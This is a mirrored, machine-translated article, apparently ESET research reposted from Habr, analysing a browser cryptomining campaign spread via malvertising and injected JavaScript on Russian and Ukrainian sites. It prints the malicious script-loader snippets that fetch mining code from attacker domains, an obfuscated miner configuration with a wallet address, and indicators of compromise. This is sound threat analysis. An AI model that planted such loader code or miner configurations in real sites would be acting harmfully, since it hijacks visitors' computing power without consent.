<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>In unity - profit. ESET examines browser miner</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In recent months, we have discovered JavaScript files, obviously intended for mining cryptocurrency directly in the browser. Cybercriminals have long ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>In unity - profit. ESET examines browser miner</h1><div class="post__text post__text-html js-mediator-article">  In recent months, we have discovered JavaScript files, obviously intended for mining cryptocurrency directly in the browser.  Cybercriminals have long mastered mining, but they usually install malware or potentially unwanted applications ( <a href="https://en.wikipedia.org/wiki/Potentially_unwanted_program">PUA</a> ) on victims' machines.  In this case, mining is done in the browser when the user visits certain sites.  There is no need to look for vulnerabilities and / or infect a computer - a browser with JavaScript enabled is enough (by default in most browsers). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/web/28c/4fa/23e/28c4fa23e7554f8c993124e06d8c283b.jpg"></div><a name="habracut"></a><h3>  Overview </h3><br>  According to ESET telemetry, one of the threat propagation vectors is malicious advertising ( <a href="https://www.welivesecurity.com/2014/09/10/online-ad-threat-yahoo-amazon-youtube-victims-malvertising/">malvertizing</a> ).  The type of tasks with high CPU utilization blocks most ad networks, as this reduces the quality of user interaction.  It may seem that the idea of ‚Äã‚Äãmining in the browser is contrary to common sense, since bitcoin mining requires high-performance CPU.  But the authors of the web-miner chose cryptocurrencies that do not require special equipment - it is easier to provide a sufficient number of computers, ‚Äúinfecting‚Äù the sites, and not the machines themselves. <br><br>  Campaigns of this kind can be carried out in any country, but this particular threat prevails in Russia, Ukraine and Belarus (see figure below).  The reason for targeting was probably the choice of the language of the sites into which the scripts were embedded. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/web/29a/de4/fc4/29ade4fc4c484e60a966e7fe77304611.jpg"><br>  <i>Figure 1. Countries where the web miner is most active, according to ESET telemetry</i> <br><br>  Figure 2 shows the rating of one of the domains: <code>‚Äìreasedoper[.]pw</code> , on which these scripts were placed, in the Cisco Umbrella Top 1M.  We noted a significant increase in DNS lookups at this address for March-April 2017. And on June 28, 2017, <code>reasedoper[.]pw</code> reached the 26300th line - the well-known GitHub Gist service ( <code>gist.github.com</code> ), which occupied 26293, has a comparable level of popularity. line for the same date. <br><br><img src="https://habrastorage.org/web/a36/d0d/577/a36d0d577c1f4e9886efd0a7f22c35eb.jpg"><br>  <i>Figure 2. Rating reasedoper [.] Pw in the Cisco Umbrella Top 1M.</i>  <i>The lower - the higher the popularity.</i> <br><br><h3>  Story </h3><br>  The idea of ‚Äã‚Äãmining cryptocurrency in the browser is not something new.  In 2013, students at the Massachusetts Institute of Technology (MIT) founded Tidbit, a company that offered a bitcoin mining service.  Instead of showing ads, site administrators could earn money on mining by adding a Tidbit script to their sites.  Soon the founders received a subpoena, because they used the computing power of users without their consent.  As a result, the parties came to an <a href="http://www.njconsumeraffairs.gov/News/Pages/05262015.aspx">amicable settlement</a> , but the Tidbit project had to be curtailed. <br><br>  Previously, several other services, such as <a href="https://bitcointalk.org/index.php%3Ftopic%3D9042.0"><code>bitp[.]it</code></a> , offered mining in the browser.  Services have ceased to exist due to the low efficiency of mining Bitcoins using standard CPU / GPU.  For example, the project <code>bitp[.]it</code> closed in July 2011. <br><br><h3>  How is the spread </h3><br>  A script distribution method of this type determines whether it is legitimate or undesirable.  In this case, we found two ways to force the user to execute scripts: a malicious advertisement or a hard-coded fragment of JavaScript code. <br><br><img src="https://habrastorage.org/web/5e7/216/dc7/5e7216dc7fcd4a578c8330bcf2e74e37.jpg"><br>  <i>Figure 3. Scheme of distribution of mining scripts.</i> <br><br>  <b>Malicious Ads</b> <br><br>  The main way to spread mining scripts is malicious advertising.  It is based on the purchase of traffic from the advertising network and the distribution of a malicious script instead of the usual advertising.  In this particular case, we are not sure whether the script injection has been applied or the <code>listat[.]biz</code> been compromised.  But the <code>listat[.]biz</code> really suspicious, because it seems to be copying <a href="http://www.liveinternet.ru/rating/ru/">LiveInternet counter</a> (the ranking of LiveInternet sites), a legitimate <a href="https://en.wikipedia.org/wiki/Web_counter">visitor counter</a> .  Moreover, many suspicious domains have been registered to the same email address, including the <code>lmodr[.]biz</code> , which is also present in this malicious chain. <br><br>  The main sites that provided traffic for mining scripts during July 2017 are shown in the following figure.  We noticed that sites with streaming video or browser games dominate here.  This makes sense, since users tend to spend time on the same page.  In addition, these pages are expected to have a high CPU load, which allows you to disguise the additional load from the mining script.  So he manages to work longer and use more computational power. <br><br><img src="https://habrastorage.org/web/461/c21/660/461c21660b62423fae29c00b952966c6.jpg"><br>  <i>Figure 4. Sites providing traffic to mining scripts, according to ESET telemetry.</i> <br><br>  The site that we watched with the most malicious advertising activity, <code>okino[.]tv</code> , is quite popular.  At the time of this writing, his Alexa rating was 907 in Russia and 233 in Ukraine.  Other sites used in the campaign ranked high in Alexa Top 1000 Alexa in Russia also occupied high positions. <br><br><img src="https://habrastorage.org/web/a9b/2aa/10c/a9b2aa10ce9f47c2a99664e6030470c0.png"><br>  <i>Figure 5. Alexa rating for Okino [.] Tv.</i> <br><br><img src="https://habrastorage.org/web/7db/707/0d7/7db7070d757c4394a653386d87ce5445.png"><br>  <i>Figure 6. CPU load when visiting wotsite [.] Net.</i> <br><br>  The following figure 7 shows an interesting pattern of the redirection chain.  The first three redirections implement the script provided by the next transition, as shown in Figures 8, 9, and 10. The first domain used in redirection ( <code>skyadsvideo1[.]ru</code> in our example) does not always match. <br><br>  We could also observe <code>code.moviead55[.]ru</code> .  Both belong to the same IP addresses - 167.114.238.246 and 167.114.249.120.  According to Whois, for the <code>skyad[.]video</code> domain, whose subdomain <code>code.skyad[.]video</code> also belongs to the same two addresses, the domains indicate the connection with the owner of the ad network SkyAdVideo. <br><br><img src="https://habrastorage.org/web/48f/707/df8/48f707df805847b3abf640b923d9586a.png"><br>  <i>Figure 7. Redirection chain from okino [.] Tv to the mining script.</i> <br><br><pre> <code class="javascript hljs">&lt;!--noindex--&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">div</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"sky_video"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">div</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> &lt;script type=<span class="hljs-string"><span class="hljs-string">"text/javascript"</span></span> src=<span class="hljs-string"><span class="hljs-string">"http://skyadsvideo1.ru/code.php?v=e225aa8e9c1a68539730f11001490407"</span></span>&gt;<span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> &lt;!--<span class="hljs-regexp"><span class="hljs-regexp">/noindex--&gt;</span></span></code> </pre><br>  <i>Figure 8. From the start page of Okino [.] Tv.</i> <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); script.src = <span class="hljs-string"><span class="hljs-string">'//lmodr[.]biz/mdstat2.php'</span></span>; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.head.appendChild(script)</code> </pre> <br>  <i>Figure 9. From the script on Skyadsvideo1 [.] En / code.php (after de-obfuscation).</i> <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); script.src = <span class="hljs-string"><span class="hljs-string">'//listat[.]biz/3.html?group=mdstat2_net&amp;seoref='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.referrer) + <span class="hljs-string"><span class="hljs-string">'&amp;rnd='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.random() + <span class="hljs-string"><span class="hljs-string">'&amp;HTTP_REFERER='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.URL); script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.head.appendChild(script);</code> </pre> <br>  <i>Figure 10 - lmodr [.] Biz / mdstat2.php.</i> <br><br>  A search on <a href="">PassiveTotal</a> shows that <code>listat[.]biz</code> made redirections only to mining scripts, except on June 1 and July 5, when it also redirected the user to real web-based visiting counters and to <code>anstatalsl[.]biz</code> .  It seems that <code>lmodr[.]biz</code> <code>listat[.]biz</code> and <code>listat[.]biz</code> are used only for the implementation of mining scripts. <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">show_260</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); script.src = <span class="hljs-string"><span class="hljs-string">'//mataharirama[.]xyz/launcher.9.single.js'</span></span>; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.head.appendChild(script); } show_260();</code> </pre> <br>  <i>Figure 11. listat [.] Biz / 3.html.</i> <br><br>  To our surprise, we noticed that <code>moviead55[.]ru</code> , the first transition, could also introduce a miner.  It is posted directly on the site and may mine ZCash cryptocurrency.  It uses a pool located on <code>ws.zstat[.]net:8889</code> , and communication takes place via the Web socket protocol.  However, we did not find any similarities in the code with the scripts laid out on <code>reasedoper[.]pw</code> .  It seems that these are different groups engaged in extracting benefits from the computing power of their visitors. <br><br>  <b>Hard-coded JavaScript code</b> <br><br>  We also found about 60 sites in the Google cache, in which almost the same javascript fragments were implemented as in Figure 10. The start page of these sites injects the script obtained at <code>script.php</code> . <br><br><pre> <code class="javascript hljs">&lt;script type=<span class="hljs-string"><span class="hljs-string">"text/javascript"</span></span>&gt; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.write(<span class="hljs-string"><span class="hljs-string">"&lt;script type=text/javascript src=\""</span></span>+<span class="hljs-string"><span class="hljs-string">"/script.php?group=4goodluck_org&amp;r="</span></span>+<span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.referrer)+<span class="hljs-string"><span class="hljs-string">"&amp;p="</span></span>+<span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.URL)+<span class="hljs-string"><span class="hljs-string">"\"&gt;&lt;\/script&gt;"</span></span>); <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre> <br>  <i>Figure 12. The introduction of the script in the start page.</i> <br><br>  The script addresses URLs from various domains, including the <code>static.reasedoper[.]pw</code> , which stores the mining JS script.  An analysis of these scripts is presented in the next section.  One of the domains where the embedded code fragment was also present, <code>listat[.]org</code> , has the same IP address as the other one used for malicious advertising ( <code>listat[.]biz</code> ).  Another similarity is the function name, <i>show_260</i> , which is also used in this campaign. <br><br>  A partial list of involved domains is given at the end of the post.  It appears that none of these sites is widely known. <br><br><h3>  How does the mining work </h3><br>  Several scripts are hosted on <code>static.reasedoper[.]pw</code> and <code>mataharirama[.]xyz</code> .  Scripts that contain the word <i>multi</i> in the title are multi-threaded, unlike those that have the word <i>single</i> in the title and use one stream.  These are the main JavaScript files that run the mining of various cryptocurrencies.  Scripts are slightly obfuscated - string literals are written using hexadecimal control sequences (‚Äú\ x42 \ x43 ...‚Äù). <br><br>  In Figure 13, you can see that the script allows you to mine <a href="https://www.feathercoin.com/">Feathercoin</a> , <a href="https://en.wikipedia.org/wiki/Litecoin">Litecoin</a> and <a href="https://en.wikipedia.org/wiki/Monero_(cryptocurrency)">Monero</a> .  Although it seems that Litecoin is no longer mine. <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">_0xab8e5a, _0x36e7b7, _0x4c105c</span></span></span><span class="hljs-function">) </span></span>{ _0x36e7b7[_0x7e60(<span class="hljs-string"><span class="hljs-string">'0x5'</span></span>)] = { <span class="hljs-string"><span class="hljs-string">'assets_domain'</span></span>: _0x7e60(<span class="hljs-string"><span class="hljs-string">'0xee'</span></span>), <span class="hljs-string"><span class="hljs-string">'debug'</span></span>: !![], <span class="hljs-string"><span class="hljs-string">'feathercoin'</span></span>: { <span class="hljs-string"><span class="hljs-string">'pool'</span></span>: _0x7e60(<span class="hljs-string"><span class="hljs-string">'0xef'</span></span>), <span class="hljs-string"><span class="hljs-string">'default_wallet'</span></span>: <span class="hljs-string"><span class="hljs-string">'6nmfjYVToBWb2ys4deasdydPj1kW9Gyfp4'</span></span> }, <span class="hljs-string"><span class="hljs-string">'monero'</span></span>: { <span class="hljs-string"><span class="hljs-string">'pool'</span></span>: _0x7e60(<span class="hljs-string"><span class="hljs-string">'0xf0'</span></span>), <span class="hljs-string"><span class="hljs-string">'default_wallet'</span></span>: _0x7e60(<span class="hljs-string"><span class="hljs-string">'0xf1'</span></span>) }, <span class="hljs-string"><span class="hljs-string">'litecoin'</span></span>: { <span class="hljs-string"><span class="hljs-string">'pool'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span>, <span class="hljs-string"><span class="hljs-string">'default_wallet'</span></span>: <span class="hljs-string"><span class="hljs-string">''</span></span> } }; }</code> </pre> <br>  <i>Figure 13. You can mine three types of cryptocurrency.</i> <br><br>  Feathercoin and Litecoin are Bitcoin-inspired cryptocurrencies.  The main difference is that they use other hashing algorithms: <i>neoscrypt</i> and <i>scrypt,</i> respectively.  The goal is to reduce the need for special equipment, such as an ASIC miner, instead of regular CPUs.  Their production requires not only CPU power, but also considerable memory resources. <br><br>  The latest <a href="https://en.bitcoin.it/wiki/Altcoin">Altcoin</a> cryptocurrency, Monero, is different from the other two.  The main feature is an increased level of confidentiality compared to Bitcoin.  Transactions are harder to track down because its blockchain is opaque.  In particular, it uses <a href="https://link.springer.com/chapter/10.1007%25252F3-540-45682-1_32">ring signatures</a> to hide the sender address among several different address choices.  It also generates a new public key for each transfer to hide the real recipient.  The <i>cryptonight</i> hash algorithm <i>used</i> also requires a lot of memory.  So it makes sense to use this type of altcoin for JavaScript mining on conventional machines. <br><br>  Mining requires high computational power, so it is not surprising that the attackers decided to use <a href="http://asmjs.org/">asm.js</a> instead of the usual JavaScript to execute hashing algorithms.  Asm.js is one and a half to two times slower than the usual execution of these algorithms in C. There are three such scripts: <code>scrypt.asm.js</code> (Litecoin), <code>cryptonight.asm.js</code> (Monero) and <code>neoscrypt.asm.js</code> (Feathercoin). <br><br>  Finally, the address of the Feathercoin wallet is the same in all scripts, while Monero uses different addresses.  In several scripts there are the same addresses - thus, we believe that they all belong to the same cyber group.  Due to the anonymity characteristic of Monero, we could not see the amount of money that was stored in the wallets.  As for Feathercoin, the address is not visible on the network.  This is probably due to the use of the mining pool. <br><br><h3>  Link to previous web miners </h3><br>  In the mining scripts, we found the hard-coded address of the wallet Feathercoin <code>6nmfjYVToBWb2ys4deasdydPj1kW9Gyfp4</code> .  A Google search indicates that the address has been in use for several years. <br><br>  At the beginning of 2016, a user complained in a <a href="https://16rom.com/en/blog/iceweasel-100-cpu-clip2net-miner">post</a> about a script loading the CPU at 100%.  According to the description, this is very similar to what we analyzed, and the addresses of the Feathercoin wallets are the same.  By the time of discovery, the mining script was located at minecrunch [.] Co.  A search by domain name leads us to a <a href="https://cryptocurrencytalk.com/topic/24618-minecrunch-web-js-miner-with-integration-feature/">discussion</a> on cryptocurrencytalk.com, in which the user Kukunin describes his ‚Äúmodest service - MineCrunch.‚Äù  Concerning performance, the author states the following: <br><br>  <i>‚ÄúWhile classic mining on a CPU gives you too little revenue, distributed mining (hundreds and thousands of visitors) of some new cryptocoins (when using only CPU or something like that) with a near native speed (thanks to asm.js) can be very personal.</i> <i><br></i>  <i>[...]</i> <i><br></i>  <i>C Scrypt miner was compiled with Javascript using Emscripten for best performance.</i>  <i>The performance is about 1.5 times lower than that of the native cpuminer application. ‚Äù</i> <br><br>  <a href="https://kukunin.github.io/webminer/">The link</a> in the first post gives the same address of the Feathercoin wallet as an example.  This reinforces the connection between the miner <code>reasedoper[.]pw</code> and <code>minecrunch[.]co</code>  Although the goal of MineCrunch was to offer an open service for distributed mining, the revenue generated by <code>reasedoper[.]pw</code> obviously only went to the author of MineCrunch (or owners of hard-coded addresses. <br><br><h3>  Conclusion </h3><br>  Despite the decrease in productivity when using a script instead of a native program, the number of visitors to sites with a mining script allows operators to benefit.  In June, the number of DNS lookups for <code>reasedoper[.]pw</code> was the same as for <code>gist.github.com</code> , according to the Cisco Umbrella Top 1M. <br><br>  Even if we consider this activity as an alternative to traditional advertising, it is undesirable without the consent of the user.  The New Jersey Division of Consumer Affairs (New Jersey Division of Consumer Affairs) has decided that mining on a user's machine without obtaining its consent is equal to accessing a computer.  Thus, the developers of such services should explicitly notify the user before the start of mining, which was clearly not done in the case of distribution through malicious advertising. <br><br>  Users can protect themselves from such threats with the help of an ad blocker or scripts installed as an add-on in browsers.  Users of ESET products can protect themselves from these malicious scripts, defined as <i>JS / CoinMiner.A potentially unsafe application</i> , by <a href="https://support.eset.com/kb3204">enabling the detection of</a> potentially unwanted applications. <br><br><h3>  Indicators of compromise </h3><br>  <b>URL address</b> <br><br><img src="https://habrastorage.org/web/12d/e91/a7e/12de91a7e1994fe48bc3fe039352c481.png"><br><br>  <b>SHA-1</b> <br><br> <code>d5482f2f7bab8a8832f65f6ba5dc2edc5e19687f launcher.5.multi.js <br> b5d475d9c084d652faabe3888bbda5b673ebe9dd launcher.5.single.js <br> 626646c572211e157dceeb4b918b9f46c3c656f5 launcher.6.single.js <br> 3c70b32180c2e6ae39006eee867135650c98cfa0 launcher.6.multi.js <br> 80c11eb331758a4d6d581ddcb5ebeca9410afe93 launcher.7.multi.js <br> 52317c0abdc69f356dd2865c1fd35923f8beb7d3 launcher.7.single.js <br> 31d40684cd765ef6625fd9a03d2522d84f0ca79b launcher.8.single.js <br> 9bc931ec55d1fed45bec1c571a401f4a201a02cf launcher.8.multi.js <br> afae4cf246125671b7eae976c7329b4e0729e109 launcher.9.multi.js <br> 3ac2e2d827e39bd802d5e3f7619099696bc38955 launcher.9.single.js <br> c4c5f13f0250364bd1321d038d56dbf1a97154f8 launcher.10.single.js <br> 29695469e53822602d9b1884c2268a68e80df999 launcher.10.multi.js <br> b34216ee46ea1355cbc956514012e74ff9712129 launcher.11.multi.js <br> 9394db4ba0ee70673d451547fd4ae40bfea6112d launcher.11.single.js <br> 6f0bf3fa4dea541a7293b89661d539bb602218c6 launcher.12.single.js <br> 3512351bd8903ae82cc1162fed4faaafceba893d launcher.12.multi.js <br> 5adf5146a84699b6aca5e9da52bb629bceaa7726 launcher.13.single.js <br> 8c45141791b94e172fd5ad8eaefebe5ebb8e729c launcher.13.multi.js <br> 519928629becb1f8b18a56609b03d4cea3c52ddd launcher.14.multi.js <br> c5629530af39c99c25f83baee7db4a24a9d0aa03 launcher.14.single.js <br> bf3a1151bc4f8188f735583257ecbbd1eaff123f launcher.15.multi.js <br> 6e5d2b1b9f1140079f3b48edec09c8515e77e14d launcher.15.single.js <br> 12b1bfd6b49c02f928f0429f1505d114583c213c monero.worker.js <br> 885f102c9d4dd2e286401756ca265e4aa3f7a664 scrypt.worker.js</code> <br> <br>  <b>Detection</b> <br><br>  <i>JS / CoinMiner.A unsafe app</i> <br><br>  <b>Domains with a hard-coded injected script</b> <b><br></b> <br> <code>allday[.]in[.]ua <br> anekbook[.]ru <br> bike[.]co[.]ua <br> cg-lab[.]ru <br> dikobras[.]com <br> doctrina62[.]ru <br> ekavuz[.]ru <br> fenix-45[.]ru <br> ipnalog[.]ru <br> jobochakov[.]com <br> kharkov-arenda[.]com[.]ua <br> kuzdoska[.]ru <br> laminirovanievolos[.]ru <br> marlin-group[.]ru <br> mat4ast[.]com <br> megalifez[.]net <br> mirstihoff[.]ru <br> munirufa[.]ru <br> murlyka[.]net[.]ua <br> newscom[.]ru <br> obad[.]ru <br> ogms[.]ru <br> opinionblog[.]ru <br> optiplast[.]ru <br> otdamprimy[.]ru <br> pcook[.]ru <br> pogelanie[.]info <br> posbank[.]ru <br> programs-tv[.]ru <br> psinovo[.]ru <br> scoot-club[.]ru <br> ska4ka[.]com <br> stihi[.]by <br> stihoslov[.]ru <br> subcar[.]org <br> sumytex[.]in[.]ua <br> suntehnic[.]ru <br> td-klassik[.]ru <br> trbook[.]com[.]ua <br> vstupino[.]su <br> x-sport[.]info</code> </div><p>Source: <a href="https://habr.com/ru/post/337960/">https://habr.com/ru/post/337960/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../337942/index.html">Welcome to mini ai cups</a></li>
<li><a href="../337946/index.html">How to write your first Linux device driver</a></li>
<li><a href="../337950/index.html">We enter the rating of the participant Dribbble and Behance on "My Circle"</a></li>
<li><a href="../337952/index.html">Mathematics for the programmer</a></li>
<li><a href="../337958/index.html">iOS + Kotlin. What can be done now</a></li>
<li><a href="../337962/index.html">Where to go vendor when Amazon is too tough: we come up with a marketplace for niche gadgets</a></li>
<li><a href="../337964/index.html">Docker, or There and back</a></li>
<li><a href="../337968/index.html">What do large successful open source projects have in common?</a></li>
<li><a href="../337970/index.html">People's Privacy Policy</a></li>
<li><a href="../337972/index.html">On the factor of the case when playing "Monopoly"</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>